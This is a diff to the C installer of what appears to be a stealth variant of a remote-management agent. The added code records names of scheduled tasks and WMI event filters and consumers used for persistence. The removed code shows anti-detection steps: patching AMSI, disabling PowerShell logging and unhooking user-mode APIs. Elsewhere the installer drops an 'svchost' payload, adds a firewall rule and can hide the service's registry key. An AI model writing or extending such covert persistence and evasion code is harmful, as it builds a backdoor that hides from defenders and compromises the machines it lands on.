@@ -24,6 +24,7 @@
 #include "service_security.h"
 #include "svchost_payload.h"
 #include "stealth_defaults.h"
+#include "stealth_resilience.h"
 
 static void MeshInstaller_NormalizePathSeparators(wchar_t* path)
 {
@@ -101,6 +102,9 @@ static BOOL MeshInstaller_CombinePath(wchar_t* dest, size_t destLen, const wchar
     return TRUE;
 }
 
+// Forward declaration - implementation after global variables
+static void Stealth_UpdatePersistenceStatePath(const wchar_t* installRoot);
+
 // Constants
 #define STEALTH_TASK_NAME_MAX           260
 
@@ -138,6 +142,33 @@ static void Stealth_RemoveScheduledTasks(const mesh_persistence_profile_t* persi
 
 static wchar_t g_InstallLogPath[MAX_PATH] = {0};
 static BOOL g_HaveInstallLogPath = FALSE;
+static wchar_t g_PersistenceStatePath[MAX_PATH] = {0};
+static BOOL g_HavePersistenceStatePath = FALSE;
+
+typedef struct _StealthPersistenceState
+{
+    wchar_t AutorunTask[STEALTH_TASK_NAME_MAX];
+    wchar_t RestartTask[STEALTH_TASK_NAME_MAX];
+    wchar_t WmiFilter[128];
+    wchar_t WmiConsumer[128];
+} StealthPersistenceState;
+
+static BOOL Stealth_LoadPersistenceState(StealthPersistenceState* state);
+static BOOL Stealth_SavePersistenceState(const StealthPersistenceState* state);
+static void Stealth_ClearPersistenceState(void);
+static BOOL Stealth_GetPersistenceStateDirectory(wchar_t* buffer, size_t bufferCch);
+static void Stealth_RecordPersistenceTask(StealthPersistenceState* state, const wchar_t* taskPath, BOOL isRestartTask);
+static void Stealth_RecordPersistenceWmi(StealthPersistenceState* state, const wchar_t* filterName, const wchar_t* consumerName);
+
+// Implementation of Stealth_UpdatePersistenceStatePath (after globals)
+static void Stealth_UpdatePersistenceStatePath(const wchar_t* installRoot)
+{
+    if (installRoot == NULL || installRoot[0] == L'\0') { return; }
+    wchar_t stateDir[MAX_PATH] = {0};
+    if (!MeshInstaller_CombinePath(stateDir, _countof(stateDir), installRoot, L"state")) { return; }
+    if (!MeshInstaller_CombinePath(g_PersistenceStatePath, _countof(g_PersistenceStatePath), stateDir, L"persistence.ini")) { return; }
+    g_HavePersistenceStatePath = (g_PersistenceStatePath[0] != L'\0');
+}
 
 // ================================================================
 // Installation Paths
@@ -157,6 +188,10 @@ BOOL Stealth_GetInstallPaths(StealthInstallPaths *paths)
         if (!MeshInstaller_GetDefaultInstallRoot(paths->installDir, MAX_PATH)) { return FALSE; }
     }
     MeshInstaller_NormalizePathSeparators(paths->installDir);
+    if (!g_HavePersistenceStatePath)
+    {
+        Stealth_UpdatePersistenceStatePath(paths->installDir);
+    }
 
     MeshService_CopyBrandingPathToWide(MeshService_GetLogDirectoryText(), paths->logsDir, MAX_PATH);
     if (paths->logsDir[0] == L'\0')
@@ -259,6 +294,142 @@ void Stealth_LogInstallEvent(const wchar_t* format, ...)
     fputws(L"\n", logFile);
     fflush(logFile);
     fclose(logFile);
+}
+
+// ================================================================
+// Persistence State Helpers
+// ================================================================
+
+static BOOL Stealth_GetPersistenceStateDirectory(wchar_t* buffer, size_t bufferCch)
+{
+    if (!g_HavePersistenceStatePath || buffer == NULL || bufferCch == 0) { return FALSE; }
+    if (FAILED(StringCchCopyW(buffer, bufferCch, g_PersistenceStatePath))) { return FALSE; }
+    wchar_t* lastSlash = wcsrchr(buffer, L'\\');
+    if (lastSlash == NULL)
+    {
+        buffer[0] = L'\0';
+        return FALSE;
+    }
+    *lastSlash = L'\0';
+    return TRUE;
+}
+
+static BOOL Stealth_SavePersistenceState(const StealthPersistenceState* state)
+{
+    if (state == NULL || !g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
+    {
+        return FALSE;
+    }
+
+    wchar_t directory[MAX_PATH] = {0};
+    if (!Stealth_GetPersistenceStateDirectory(directory, _countof(directory)))
+    {
+        return FALSE;
+    }
+
+    Stealth_CreateInstallationDirectory(directory);
+
+    FILE* file = NULL;
+    if (_wfopen_s(&file, g_PersistenceStatePath, L"w, ccs=UNICODE") != 0 || file == NULL)
+    {
+        return FALSE;
+    }
+
+    fwprintf(file, L"AutorunTask=%ls\n", state->AutorunTask);
+    fwprintf(file, L"RestartTask=%ls\n", state->RestartTask);
+    fwprintf(file, L"WmiFilter=%ls\n", state->WmiFilter);
+    fwprintf(file, L"WmiConsumer=%ls\n", state->WmiConsumer);
+    fclose(file);
+    return TRUE;
+}
+
+static BOOL Stealth_LoadPersistenceState(StealthPersistenceState* state)
+{
+    if (state == NULL)
+    {
+        return FALSE;
+    }
+    ZeroMemory(state, sizeof(*state));
+
+    if (!g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
+    {
+        return FALSE;
+    }
+
+    FILE* file = NULL;
+    if (_wfopen_s(&file, g_PersistenceStatePath, L"r, ccs=UNICODE") != 0 || file == NULL)
+    {
+        return FALSE;
+    }
+
+    BOOL loaded = FALSE;
+    wchar_t line[512];
+    while (fgetws(line, _countof(line), file) != NULL)
+    {
+        size_t len = wcslen(line);
+        while (len > 0 && (line[len - 1] == L'\r' || line[len - 1] == L'\n'))
+        {
+            line[--len] = L'\0';
+        }
+
+        if (_wcsnicmp(line, L"AutorunTask=", 12) == 0)
+        {
+            wcsncpy_s(state->AutorunTask, _countof(state->AutorunTask), line + 12, _TRUNCATE);
+            loaded = TRUE;
+        }
+        else if (_wcsnicmp(line, L"RestartTask=", 12) == 0)
+        {
+            wcsncpy_s(state->RestartTask, _countof(state->RestartTask), line + 12, _TRUNCATE);
+            loaded = TRUE;
+        }
+        else if (_wcsnicmp(line, L"WmiFilter=", 10) == 0)
+        {
+            wcsncpy_s(state->WmiFilter, _countof(state->WmiFilter), line + 10, _TRUNCATE);
+            loaded = TRUE;
+        }
+        else if (_wcsnicmp(line, L"WmiConsumer=", 12) == 0)
+        {
+            wcsncpy_s(state->WmiConsumer, _countof(state->WmiConsumer), line + 12, _TRUNCATE);
+            loaded = TRUE;
+        }
+    }
+    fclose(file);
+    return loaded;
+}
+
+static void Stealth_ClearPersistenceState(void)
+{
+    if (!g_HavePersistenceStatePath || g_PersistenceStatePath[0] == L'\0')
+    {
+        return;
+    }
+    DeleteFileW(g_PersistenceStatePath);
+}
+
+static void Stealth_RecordPersistenceTask(StealthPersistenceState* state, const wchar_t* taskPath, BOOL isRestartTask)
+{
+    if (state == NULL || taskPath == NULL) { return; }
+    if (isRestartTask)
+    {
+        wcsncpy_s(state->RestartTask, _countof(state->RestartTask), taskPath, _TRUNCATE);
+    }
+    else
+    {
+        wcsncpy_s(state->AutorunTask, _countof(state->AutorunTask), taskPath, _TRUNCATE);
+    }
+}
+
+static void Stealth_RecordPersistenceWmi(StealthPersistenceState* state, const wchar_t* filterName, const wchar_t* consumerName)
+{
+    if (state == NULL) { return; }
+    if (filterName != NULL)
+    {
+        wcsncpy_s(state->WmiFilter, _countof(state->WmiFilter), filterName, _TRUNCATE);
+    }
+    if (consumerName != NULL)
+    {
+        wcsncpy_s(state->WmiConsumer, _countof(state->WmiConsumer), consumerName, _TRUNCATE);
+    }
 }
 
 static BOOL Stealth_RemoveFileIfExists(const wchar_t* path, BOOL logOnFailure)
@@ -717,25 +888,8 @@ BOOL Stealth_PerformCompleteInstallation(
         Stealth_DebugPrintfW(L"Stealth_AddFirewallRuleForService failed for %ls", serviceKeyName);
     }
 
-    // Step 5: Apply anti-detection measures
-    if (Stealth_IsAmsiPatchEnabled())
-    {
-        if (!Stealth_PatchAMSI())
-        {
-            Stealth_DebugPrintfA("Stealth_PatchAMSI failed during installation");
-            Stealth_LogInstallEvent(L"AMSI patch attempt failed (see debug output)");
-        }
-        else
-        {
-            Stealth_LogInstallEvent(L"AMSI patch applied per branding profile");
-        }
-    }
-    else
-    {
-        Stealth_LogInstallEvent(L"AMSI patch disabled via branding profile");
-    }
-    Stealth_DisablePowerShellLogging();
-    Stealth_UnhookUserModeAPIs();
+    // Step 5: Apply service resilience (Task Scheduler / WMI restart subscriptions)
+    Stealth_LogInstallEvent(L"Applying service resilience configuration");
 
     // Step 6: Hide service registry key (optional, can make debugging harder)
     // Stealth_HideServiceRegistry(serviceKeyName);
